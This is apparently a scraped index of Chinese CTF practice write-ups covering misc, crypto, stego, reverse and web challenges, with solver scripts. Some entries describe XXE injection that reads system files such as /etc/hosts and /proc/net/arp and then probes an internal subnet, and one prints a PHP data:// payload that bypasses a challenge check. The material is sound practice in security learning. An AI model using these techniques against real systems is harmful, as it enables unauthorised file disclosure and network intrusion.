","date":"2022-04-11","objectID":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/:6:0","tags":["CTF"],"title":"CTF练习Week3","uri":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/"},{"categories":["WriteUp"],"content":"0x06 2022数字中国车联网层层关卡 ida打开分析，发现主要是main函数的6个check对字符串进行了处理。 第一个check是检查flag的长度是否为34，第二个检查是否为flag{开头，第三个检查是否以}结尾。 第四个将_前的第一部分拆分，如果字符是数字，则减87，如果是小写字母，则减48。将奇数位字符的ascii值乘以16后与偶数位字符的ascii进行或操作，得到的值为olympics，可以爆求解。 第五个将flag{xx_xx_xx}中间的部分分别与32、33进行异或运算，得到in。 第六个是将flag最后的部分进行base64解密，得到china。 汇总脚本如下： import base64\rdic='0123456789abcdef'\rs1='olympics'\rs2='in'\rs3=b'china'\rflag='flag{'\rdef fun1(x):\rif( ord(x)\u003c=47 or ord(x)\u003e57):\rif ( ord(x)\u003e96 and ord(x)\u003c=102):\rx = chr(ord(x)-87)\relse:\rx = chr(ord(x)-48)\rreturn x\rfor i in range(len(s1)):\rfor x in dic:\rfor y in dic:\rif ((ord(fun1(x))*16)|ord(fun1(y))) == ord(s1[i]):\rflag +=x\rflag +=y\rflag+='_'\rfor i in range(len(s2)):\rif (i\u00261)!=0:\rflag += chr(ord(s2[i])^33)\relse:\rflag += chr(ord(s2[i])^32)\rflag+='_'\rencodestr=base64.b64encode(s3)\rflag += str(encodestr)[2:-1]\rflag += '}'\rprint(flag) ","date":"2022-04-11","objectID":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/:7:0","tags":["CTF"],"title":"CTF练习Week3","uri":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/"},{"categories":["WriteUp"],"content":"\r","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:0:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x00 [UTCTF2020]file header 修改文件头，得到flag ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:1:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x01 [GKCTF 2021]excel 骚操作 点击发现，有的空白格上的数值是1。 设置单元格式，显示出所有的1 然后设置突出显示，得到汉信码，扫描得到flag。 ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:2:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x02 [湖南省赛2019]Findme tweakpng分析1.png发现chunk处存在问题 用010分析发现缺少IDAT的标识，手动添加一下。 脚本爆破宽高 import zlib\rimport struct\rfilename = '1.png'\rwith open(filename, 'rb') as f:\rall_b = f.read()\rcrc32key = int(all_b[29:33].hex(),16)\rdata = bytearray(all_b[12:29])\rn = 4095 for w in range(n): width = bytearray(struct.pack('\u003ei', w)) for h in range(n):\rheight = bytearray(struct.pack('\u003ei', h))\rfor x in range(4):\rdata[x+4] = width[x]\rdata[x+8] = height[x]\rcrc32result = zlib.crc32(data)\rif crc32result == crc32key:\rprint(\"宽为：\",end=\"\")\rprint(width)\rprint(\"高为：\",end=\"\")\rprint(height)\r得到 放到stegslover里面，在bule2时发现二维码，扫描得到ZmxhZ3s0X3 在2.png的文件尾发现7z的字样，提取出来，而后发现PK被修改成7z，解压得到1000个txt。 大小排序得到隐藏信息1RVcmVfc 3.png的每一个chunk的crc32都是一个字符的ascii编码，得到3RlZ30= 4.png和5.png直接用010查看即可 按照P1-P5-P4-P2-P3拼接得到ZmxhZ3s0X3Yzcllfc0lNcExlX1BsY1RVcmVfc3RlZ30=，解码得到flag。 ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:3:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x03 我爱Linux 图片FFD9后存在冗余数据，导出另存为。 看了wp才知道得到的文件内容是Python Picke序列化内容，直接用脚本提取 import pickle fp = open(\"123.txt\",\"rb+\")\rfw = open('pickle.txt', 'w')\ra=pickle.load(fp)\rpickle=str(a)\rfw.write( pickle )\rfw.close()\r得到一系列坐标代码 [[(3, 'm'), (4, '\"'), (5, '\"'), (8, '\"'), (9, '\"'), (10, '#'), (31, 'm'), (32, '\"'), (33, '\"'), (44, 'm'), (45, 'm'), (46, 'm'), (47, 'm'), (50, 'm'), (51, 'm'), (52, 'm'), (53, 'm'), (54, 'm'), (55, 'm'), (58, 'm'), (59, 'm'), (60, 'm'), (61, 'm'), (66, 'm'), (67, '\"'), (68, '\"'), (75, '#')], [(1, 'm'), (2, 'm'), (3, '#'), (4, 'm'), (5, 'm'), (10, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (31, '#'), (37, 'm'), (38, 'm'), (39, 'm'), (43, '\"'), (47, '\"'), (48, '#'), (54, '#'), (55, '\"'), (57, '\"'), (61, '\"'), (62, '#'), (64, 'm'), (65, 'm'), (66, '#'), (67, 'm'), (68, 'm'), (72, 'm'), (73, 'm'), (74, 'm'), (75, '#')], [(3, '#'), (10, '#'), (15, '\"'), (19, '#'), (22, '#'), (23, '\"'), (25, '\"'), (26, '#'), (29, 'm'), (30, 'm'), (31, '\"'), (36, '\"'), (40, '#'), (47, 'm'), (48, '\"'), (53, 'm'), (54, '\"'), (59, 'm'), (60, 'm'), (61, 'm'), (62, '\"'), (66, '#'), (71, '#'), (72, '\"'), (74, '\"'), (75, '#')], [(3, '#'), (10, '#'), (15, 'm'), (16, '\"'), (17, '\"'), (18, '\"'), (19, '#'), (22, '#'), (26, '#'), (31, '#'), (36, 'm'), (37, '\"'), (38, '\"'), (39, '\"'), (40, '#'), (45, 'm'), (46, '\"'), (52, 'm'), (53, '\"'), (61, '\"'), (62, '#'), (66, '#'), (71, '#'), (75, '#')], [(3, '#'), (10, '\"'), (11, 'm'), (12, 'm'), (15, '\"'), (16, 'm'), (17, 'm'), (18, '\"'), (19, '#'), (22, '\"'), (23, '#'), (24, 'm'), (25, '\"'), (26, '#'), (31, '#'), (36, '\"'), (37, 'm'), (38, 'm'), (39, '\"'), (40, '#'), (43, 'm'), (44, '#'), (45, 'm'), (46, 'm'), (47, 'm'), (48, 'm'), (51, 'm'), (52, '\"'), (57, '\"'), (58, 'm'), (59, 'm'), (60, 'm'), (61, '#'), (62, '\"'), (66, '#'), (71, '\"'), (72, '#'), (73, 'm'), (74, '#'), (75, '#')], [(23, 'm'), (26, '#'), (32, '\"'), (33, '\"')], [(24, '\"'), (25, '\"')], [], [(12, '#'), (17, 'm'), (18, '\"'), (19, '\"'), (23, 'm'), (24, 'm'), (25, 'm'), (26, 'm'), (33, '#'), (36, 'm'), (37, 'm'), (38, 'm'), (39, 'm'), (40, 'm'), (41, 'm'), (46, 'm'), (47, 'm'), (52, 'm'), (53, 'm'), (54, 'm'), (65, 'm'), (66, 'm'), (67, 'm'), (68, 'm'), (71, 'm'), (72, 'm'), (73, 'm'), (74, 'm'), (75, 'm'), (76, 'm')], [(2, 'm'), (3, 'm'), (4, 'm'), (9, 'm'), (10, 'm'), (11, 'm'), (12, '#'), (15, 'm'), (16, 'm'), (17, '#'), (18, 'm'), (19, 'm'), (22, '\"'), (26, '\"'), (27, '#'), (30, 'm'), (31, 'm'), (32, 'm'), (33, '#'), (40, '#'), (41, '\"'), (45, 'm'), (46, '\"'), (47, '#'), (50, 'm'), (51, '\"'), (55, '\"'), (58, 'm'), (59, 'm'), (60, 'm'), (64, '#'), (65, '\"'), (68, '\"'), (69, 'm'), (75, '#'), (76, '\"')], [(1, '#'), (2, '\"'), (5, '#'), (8, '#'), (9, '\"'), (11, '\"'), (12, '#'), (17, '#'), (24, 'm'), (25, 'm'), (26, 'm'), (27, '\"'), (29, '#'), (30, '\"'), (32, '\"'), (33, '#'), (39, 'm'), (40, '\"'), (44, '#'), (45, '\"'), (47, '#'), (50, '#'), (51, 'm'), (52, '\"'), (53, '\"'), (54, '#'), (55, 'm'), (57, '#'), (58, '\"'), (61, '#'), (64, '#'), (65, 'm'), (68, 'm'), (69, '#'), (74, 'm'), (75, '\"')], [(1, '#'), (2, '\"'), (3, '\"'), (4, '\"'), (5, '\"'), (8, '#'), (12, '#'), (17, '#'), (26, '\"'), (27, '#'), (29, '#'), (33, '#'), (38, 'm'), (39, '\"'), (43, '#'), (44, 'm'), (45, 'm'), (46, 'm'), (47, '#'), (48, 'm'), (50, '#'), (55, '#'), (57, '#'), (58, '\"'), (59, '\"'), (60, '\"'), (61, '\"'), (65, '\"'), (66, '\"'), (67, '\"'), (69, '#'), (73, 'm'), (74, '\"')], [(1, '\"'), (2, '#'), (3, 'm'), (4, 'm'), (5, '\"'), (8, '\"'), (9, '#'), (10, 'm'), (11, '#'), (12, '#'), (17, '#'), (22, '\"'), (23, 'm'), (24, 'm'), (25, 'm'), (26, '#'), (27, '\"'), (29, '\"'), (30, '#'), (31, 'm'), (32, '#'), (33, '#'), (37, 'm'), (38, '\"'), (47, '#'), (51, '#'), (52, 'm'), (53, 'm'), (54, '#'), (55, '\"'), (57, '\"'), (58, '#'), (59, 'm'), (60, 'm'), (61, '\"'), (64, '\"'), (65, 'm'), (66, 'm'), (67, 'm'), (68, '\"'), (72, 'm'), (73, '\"')], [], [], [], [(5, '#'), (8, '#'), (16, 'm'), (17, 'm'), (18, 'm'), (19, 'm'), (23, 'm'), (24, 'm'), (25, 'm'), (26, ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:4:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x04 大流量分析（一） 某黑客对A公司发动了攻击，以下是一段时间内我们获取到的流量包，那黑客的攻击ip是多少？ 下载流量包后通过wireshark的统计功能，筛选出最多的ip，得到183.129.152.140。 ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:5:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x05 大流量分析（二） 黑客对A公司发动了攻击，以下是一段时间内获取到的流量包，那黑客使用了哪个邮箱给员工发送了钓鱼邮件? 由于是邮件，所以首先过滤SMTP协议，然后一个个查看邮件的内容，最后确认邮箱为xsser@live.cn。 ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:6:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x06 [NPUCTF2020]碰上彩虹，吃定彩虹！ 在lookatme.txt中发现空白字符，转换得到.-/..-/-/---/-.-/./-.--，解密得到AUTOKEY，应该使用了AUTOKEY加密 使用https://github.com/Yoshino-s/breakautokey来进行爆破，得到iamthepassword maybehint.txt 提示隐藏了一些信息,用 vim 查看 零宽字符隐写，在http://330k.github.io/misc_tools/unicode_steganography.html网站进行解密 使用ntfsstreamseditor 发现隐藏信息 字符有限且不断循环，使用脚本计算词频，最后得到ZW5jcnlwdG8=，解base64得到encrypto from collections import Counter\rf=open('out.txt','r')\rf_read=f.read()\rprint (Counter(f_read))\r百度搜索发现这是一款软件，下载安装，其加密的文件后缀名为.crypto，打开得到hint，用autokey爆破得到的密码进行解压。 解压发现解不出，进一步分析发现。 得到一张彩虹.png 分析发现存在隐藏的zip，foremost提取出来。 得到的图片，用snipate对分段的黄色进行屏幕取色，得到 #ffff70\r#ffff3f\r#ffff73\r#ffff73\r#ffff57\r#ffff64\r将后两位拼凑在一起，转ascii得到密码p@ssWd，解压得到内容 eeeeeeeeeepaeaeeeaeAeeeeeeaeeeeeeeeeeccccisaaaaeejeeeeeejiiiiiiLiiiiijeeeeeejeeeeeeeeeeeeeeeeeeeejcceeeeeeeeeeePeeeeeeeejaaiiiiiiijcciiiiiiiiiijaaijiiiiiiiiiiiiiiiiiiiijeeeeeeHeeeeeeeeeeeeeeeeejcceeeeeeeeeeeejaaiiiijeeeeeeejceeeeeeeeeeeeeeeeeeeeeeeeejceeeeeeeeeeeeeeeeejaeeeeeejciiUiiiiiiiiiiiiiiiiijaeeeejceeeeeeeeeCeeeeeeeeejajciiiiiiiiiiiiiiiiiiijaaiiiijiijeeeeeeeeeeejKcciiiiiiiiiiiiiiijaaij 分析发现加密方式为Alphuck，进行转换即可得到flag。 ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:7:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x07 [羊城杯 2020]signin 玩具总动员里面，巴斯光年成功上天，胡迪给他发了一段加密短信，但是不知道是什么？你能帮巴斯光年破解吗？胡迪给了一段明文，一表人才，二表倒立，相信聪明的你一定可以帮助他吧！ signin.txt里的内容如下 BCEHACEIBDEIBDEHBDEHADEIACEGACFIBDFHACEGBCEHBCFIBDEGBDEGADFGBDEHBDEGBDFHBCEGACFIBCFGADEIADEIADFH\r卡在这里很久，参考https://blog.csdn.net/mochu7777777/article/details/116056136才知道这个加密是Toy Cipher: https://eprint.iacr.org/2020/301.pdf 脚本如下： cipherdic = {'M':'ACEG','R':'ADEG','K':'BCEG','S':'BDEG','A':'ACEH','B':'ADEH','L':'BCEH','U':'BDEH','D':'ACEI','C':'ADEI','N':'BCEI','V':'BDEI','H':'ACFG','F':'ADFG','O':'BCFG','W':'BDFG','T':'ACFH','G':'ADFH','P':'BCFH','X':'BDFH','E':'ACFI','I':'ADFI','Q':'BCFI','Y':'BDFI'} ciphertext = '' with open('signin.txt','r') as f: f = f.read() for i in range(0,len(f),4): block = f[i:i+4] for j in cipherdic: if block == cipherdic[j]: ciphertext += j original_list = ['M','R','K','S','A','B','L','U','D','C','N','V','H','F','O','W','T','G','P','X','E','I','Q','Y'] reversed_list = original_list[::-1] flag = '' for char in ciphertext: for olist in original_list: if char == olist: oindex = original_list.index(olist) flag += reversed_list[oindex] print(flag) ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:8:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"0x08 [WMCTF2020]行为艺术 解压得到hint.txt md5sum flag.zip 17f5b08342cf65f6dc08ed0b4c9bd334 flag.zip\r图片crc32存在问题，修改高度。 最后的图很像机器学习数据集，504b的开头联想到压缩包，参考https://hachp1.github.io/posts/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/20200814-wm2020.html#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%AD%97%E6%AF%8D 提取的数据为 504B0304140000000800DB93C55086A39007D8000000DF01000008000000666C61672E74787475504B0E823010DD93708771DDCCB0270D5BBD0371815A9148AC6951C2ED9D271F89C62E2693D7F76BB7DE9FC80D2E6E68E782A326D2E01F81CE6D55E76972E9BA7BCCB3ACEF7B89F7B6E90EA16A6EE2439D45179ECDD1C5CCFB6B9AA489C1218C92B898779D765FCCBB58CC920B6662C5F91749931132258F32BBA7C288C5AE103133106608409DAC419F77241A3412907814AB7A922106B8DED0D25AEC8A634929025C46A33FE5A1D3167A100323B1ABEE4A7A0708413A19E17718165F5D3E73D577798E36D5144B66315AAE315078F5E51A29246AF402504B01021F00140009000800DB93C55086A39007D8000000DF010000080024000000000000002000000000000000666C61672E7478740A00200000000000010018004A0A9A64243BD601F9D8AB39243BD6012D00CA13223BD601504B050600000000010001005A000000FE00000000000000 转换成压缩包，解开伪加密，得到的文本转brainfuck即可得到flag。 Good eyes! Here is your flag:\rhttps://www.splitbrain.org/services/ook\r+++++ ++++[ -\u003e+++ +++++ +\u003c]\u003e+ +++++ .\u003c+++ [-\u003e-- -\u003c]\u003e- .\u003c+++ [-\u003e-- -\u003c]\u003e-\r.\u003c+++ +[-\u003e+ +++\u003c] \u003e+.\u003c+ ++[-\u003e ---\u003c] \u003e---- -.\u003c++ +++++ [-\u003e++ +++++ \u003c]\u003e++\r++.-- --.\u003c+ +++[- \u003e---- \u003c]\u003e-- ----. +++++ +++.\u003c +++[- \u003e---\u003c ]\u003e-.+ ++.++\r+++++ .\u003c+++ [-\u003e-- -\u003c]\u003e- .+++. -.... --.++ +.\u003c++ +[-\u003e+ ++\u003c]\u003e ++++. \u003c++++\r++++[ -\u003e--- ----- \u003c]\u003e-- ----- ----- --.\u003c+ +++[- \u003e++++ \u003c]\u003e+. +...\u003c +++++\r+++[- \u003e++++ ++++\u003c ]\u003e+++ +++++ +++.. .-.\u003c ","date":"2022-04-03","objectID":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/:9:0","tags":["CTF"],"title":"CTF练习Week2","uri":"/2022-04-03-ctf%E7%BB%83%E4%B9%A0week2/"},{"categories":["WriteUp"],"content":"\r","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:0:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x00 WEB-[NCTF2019]True XML cookbook 访问网页源码 发现是以xml格式传入用户名密码的，且输入的用户名信息会返回到前端，尝试XXE注入，成功读取到文件。 查看/etc/hosts，探测内网存活的主机。hosts文件是Linux系统上一个负责ip地址与域名快速解析的文件，以ascii格式保存在/etc/目录下。hosts文件包含了ip地址与主机名之间的映射，还包括主机的别名。但是没有发现有效的信息。 然后查看arp缓存列表/proc/net/arp文件，发现一个ip地址，但爆破后没有得到有效结果。查看路由缓存表proc/net/fib_trie文件，获取服务器IP和网络架构。 爆破10.244.80C段的ip得到flag ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:1:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x01 MISC-[HackingClubCTF 2022]你能看懂音符吗？ 修改文件头 解压得到 把音符在https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue解密即可得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:2:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x02 Crypto-[HackingClubCTF 2022]影子系统 我们得到了一串神秘字符串：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，为了确定这个神秘字符串，我们通过了其他途径获得了这个字串的32位MD5码。但是我们获得它的32位MD5码也是残缺不全，E903???4DAB????08?????51?80??8A?,请猜出神秘字符串的原本模样，并且提交这个字串的32位MD5码作为答案。 这个写脚本爆破就出来了。 import hashlib\rimport string\rdef md5(str):\rm = hashlib.md5()\rm.update(str.encode(\"utf8\"))\rreturn m.hexdigest()\rfor i in string.ascii_uppercase:\rfor j in string.ascii_uppercase:\rfor k in string.ascii_uppercase:\rc = 'TASC' + i + 'O3RJMV' + j + 'WDJKX' + k + 'ZM'\rx = md5(c).upper()\rif 'E903' in x and '4DAB' in x and '08' in x and '51' in x and '80' in x and '8A' in x:\rprint(x)\rbreak\r","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:3:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x03 取证-[HackingClubCTF 2022]后门！！OMG！ 上D盾开扫，发现可疑文件 查看webshell密码0578b19a3360292c22bede3cf6a79272，md5后76a8753e02d1503213172ef838372365。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:4:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x04 Crypto-[HackingClubCTF 2022]异性相吸 buu原题，key和密文同为奇数或偶数相减，一奇一偶相加，脚本如下： key = open(\"key.txt\", 'rb').read()\rcipher = open(\"密文.txt\", \"rb\").read()\rflag = []\rresult = \"\"\rfor i in range(len(key)):\rflag.append(key[i] ^ cipher[i])\rresult += chr(flag[i])\rprint(flag)\rprint(result)\r","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:5:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x05 Misc-[HackingClubCTF 2022]美丽的烟火 zip伪加密，得到am5QWDVwNVp0ZkRKdW14U3NFSw==，解码得到t_hp1ass_s1wsd 栅栏编码得到th1s_1s_passwd，在firework.png发现可疑字样stegpy:shumu 使用stegpy提取下隐藏信息，得到aZgs8ImPpQOzO3CVA/wIUVq/M7X8C33ptNZSW2Blenc= 尝试base64解码，未果，想到上面的密码还没用，使用AES解密得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:6:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x06 Web-[HackingClubCTF 2022]Find my Friend 目录扫描发现data.txt文件，访问得到flag ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:7:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x07 Crypto-[HackingClubCTF 2022]乌拉 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:8:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x08 MISC-[HackingClubCTF 2022]看看这是什么星号东西 给了一张原图和2340张分割后的小图，根据图片序列猜测是宽高都按0-49分的，也就是说，图片是50x50。 执行magick montage *.png -tile 50x50 -geometry +0+0 flag.png，得到一张图片 其实隐隐约约能看到部分flag了，使用gaps没有达到理想的效果，没办法，简单手撕一下。 得到部分细节，最终的flag为flag{Hello_word_给HackingClub}，有中文属实是没想到，卡了很久。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:9:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x09 Crypto-[HackingClubCTF 2022]RC小车车嘟嘟嘟 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:10:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x0A Web-[HackingClubCTF 2022]Easy-yinkelude \u003c?php\rinclude('./flag.php');\rshow_source('./index.php');\r$file=@$_POST['file'];\rclass hello{\rpublic $falg='tql123';\r}\r$a=new hello();\r$shit=serialize($a);\rif(@file_get_contents($file) == $shit){\recho $flag;\r}else{\recho \"what are u doing? just a qian dao\";\r}\r?\u003e 分析代码可知，需要上传一个$file变量，使得它的值等于a的序列化，猜测是用data协议传序列化后的值，payload为：data://text/plain,O:5:\"hello\":1:{s:4:\"falg\";s:6:\"tql123\";} ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:11:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x0B 取证-[HackingClubCTF 2022]WebShell大马 上D盾 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:12:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x0C MISC-[HackingClubCTF 2022]史上第一难倒直男的题目 小明正在上班，想要小红的微信，但是小红给了一个32位的微信号码，请你帮帮她。 （有人说这是Crypto！但是我觉得Misc的含量更多！）\r题目信息：63c44dde47a3f48927ddddc88fb489ad 解md5，得到一串字符，以为是flag但不是，想到题目说更像MISC和微信的提示，就加wx了。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:13:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x0D MISC-[HackingClubCTF 2022]给你康个好康的~ ppt里面有几张很刺激的图片，修改文件后缀为zip，解压后在\\ppt\\media下看jpg，在image6里发现藏有压缩包。 解压后得到一个Flag.docx，但文件有加密，打不开，队友爆出密码PLJJ，解压得到flag。 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:14:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x0E Crypto-[红明谷杯]easy_ya from Crypto.Util.number import * import os from flag import flag def gen(): e = 3 while True: try: p = getPrime(512) q = getPrime(512) n = p*q phi = (p-1)*(q-1) d = inverse(e,phi) return p,q,d,n,e except: continue return p,q,d,n,e = gen() r = getPrime(512) m = bytes_to_long(flag+os.urandom(32)) M = m%r c = pow(m,e,n) print(\"r = %d\"%r) print(\"M = %d\"%M) print(\"n = %d\"%n) print(\"e = %d\"%e) print(\"c = %d\"%c) ''' r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473 M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558 n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287 e = 3 c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282 ''' e=3首先想到的是低指数的爆破，但是稍稍分析就知道这个位数不太能爆破出来，Coppersmith发现的短填充攻击，即在消息尾部或头部直接填充随机串，如果填充的随机串r的长度低于消息长度的1/9，那么攻击者便能够有效地恢复出明文M。 **Coppersmith定理：令N为大整数，f是度为e的多项式。给定N和f，可以有效地计算出方程f(x)=0 mod N所有小于N^(1/e)的解。**构造如下的多项式：f = (M+r*x)^e -c 在 Zmod(n)的多项式环上有小根x = k,由于k \u003c 2^79 \u003c n^(1/e) PR.\u003cx\u003e = PolynomialRing(Zmod(N))\rg = (M + r * x) ** e - c\rg = g.monic() #monic()表示首系数为1的单项式\rk = g.small_roots()[0]\rm = k * r + M\r","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:15:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x0F Crypto-[HackingClubCTF 2022]老套路 mvlxhirlszq{eof_eof_bvjf_jd_jd}，仿射密码 ","date":"2022-03-28","objectID":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/:16:0","tags":["CTF"],"title":"CTF练习Week1","uri":"/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/"},{"categories":["WriteUp"],"content":"0x10 MISC-[HackingClubCTF 2022]逃离东南亚 得到三个日记的压缩包，先解压第一个，发现图片，修改高度得到密码wdnmd。 第一段日记的markdown 第二段日记的markdown 文中提到了信息隐藏，看看test文件很像brainfuck，但是少了++++++++的开头，补上后成功解码，得到的字符串，形似base64加密，cyberchef转换后发现ELF的字样，保存得到可执行文件。 运行暂无有效信息 SilentEye分析打架.wav得到This1sThe3rdZIPpwd 解压日记3，得到最后的markdown 这里卡了很久，题目说是原题改的，就去查了下wp，发现需要用脚本搜索tab和空格，同时要过滤到常见的双空格和双/t，因此考虑用 \\t \\t作为搜索字符。参考：https://www.bilibili.com/read/cv14000314 import os\rdef get_file_list(dir_path):\r_file_list = os.listdir(dir_path)\rfile_list = []\rfor file_str in _file_list:\rnew_dir_path = dir_path+'\\\\'+file_str\rif os.path.isdir(new_dir_path):\rfile_list.extend(get_file_list(new_dir_path))\relse:\rfile_list.append(new_dir_path)\rreturn file_list\rfile_list = get_file_list(r'.\\source_code')\rfor file_str in file_list:\rf = open(file_str, 'r', encoding='utf-8')\rtry:\rdata = f.read()\rif ' \\t \\t' in data:\rprint(file_str)\rexcept:\rpass\r得到三个可疑的文件，在}后面有隐藏信息。 .\\source_code\\elf\\rtld.c\r.\\source_code\\malloc\\arena.c\r.\\source_code\\malloc\\malloc.c\r使用脚本读出\\t和空格，然后二进制转字符得到flag。 f_list = r'''.\\source_code\\elf\\rtld.c\r.\\source_code\\malloc\\arena.c\r.\\source_code\\malloc\\malloc.c'''\rf_list = f_list.split('\\n')\rresult = ''\rfor f in f_list:\rfor data in open(f, 